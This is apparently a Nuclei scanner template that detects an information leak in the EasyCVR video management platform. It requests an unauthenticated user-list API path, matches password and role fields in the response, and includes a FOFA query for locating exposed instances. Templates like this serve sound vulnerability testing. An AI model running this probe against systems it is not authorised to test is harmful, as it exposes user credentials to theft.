flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "<title>EasyCVR")
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}'
- matchers:
  - condition: and
    type: word
    words:
    - count
    - Password
    - RoleId
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/v1/userlist?pageindex=0&pagesize=10'
id: easycvr-info-leak
info:
  author: pussycat0x
  description: 'EasyCVR video management platform has leaked user information

    '
  metadata:
    fofa-query: title="EasyCVR"
    max-request: 2
    verified: true
